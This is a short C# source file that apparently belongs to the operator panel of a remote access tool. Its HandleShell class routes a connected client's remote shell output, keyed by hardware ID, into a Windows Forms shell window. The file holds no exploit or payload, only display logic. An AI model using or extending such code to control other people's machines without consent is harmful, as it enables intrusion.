namespace PEGASUS.BytesInOut
{
    using PEGASUS.Design;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleShell" />.
    /// </summary>
    public class HandleShell
    {
        /// <summary>
        /// Initializes a new instance of the <see cref="HandleShell"/> class.
        /// </summary>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        public HandleShell(MsgPack unpack_msgpack, Clients client)
        {
            var shell = (FormShell)Application.OpenForms["shell:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            if (shell != null)
            {
                if (shell.Client == null)
                {
                    shell.Client = client;
                    shell.timer1.Enabled = true;
                }

                shell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
                shell.richTextBox1.SelectionStart = shell.richTextBox1.TextLength;
                shell.richTextBox1.ScrollToCaret();
            }
        }
    }
}
